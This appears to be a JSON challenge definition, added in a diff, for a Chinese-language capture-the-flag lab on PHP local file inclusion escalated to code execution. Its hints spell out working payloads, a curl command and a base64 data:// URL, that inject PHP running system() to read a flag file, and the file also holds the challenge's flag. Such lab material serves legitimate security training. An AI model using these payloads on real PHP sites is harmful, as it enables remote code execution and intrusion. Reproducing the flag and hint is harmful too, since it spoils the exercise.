@@ -1,0 +1,24 @@
+{
+  "id": "lfi3",
+  "category": "lfi",
+  "title": "v3 官网 · php://input / data:// 代码执行",
+  "difficulty": "medium",
+  "url_path": "/lfi3",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{lfi3_766d78dc}",
+  "knowledge": [
+    "php://input 包含 POST body",
+    "data://text/plain(;base64) 伪协议",
+    "allow_url_include 前提",
+    "LFI 升级 RCE"
+  ],
+  "hints": [
+    "页面横幅确认 allow_url_include 是否开启（本题环境开启）",
+    "php://input = POST 原始 body；data://text/plain,代码 = URL 里直接写代码（base64 免编码烦恼）",
+    "curl -d \"<?php system('cat /flag_lfi3.txt');?>\" \"http://HOST/lfi3/?page=php://input\"；或 ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWdfbGZpMy50eHQnKTs/Pg=="
+  ],
+  "writeup": "writeup.md",
+  "prev": "lfi2",
+  "next": "lfi4"
+}
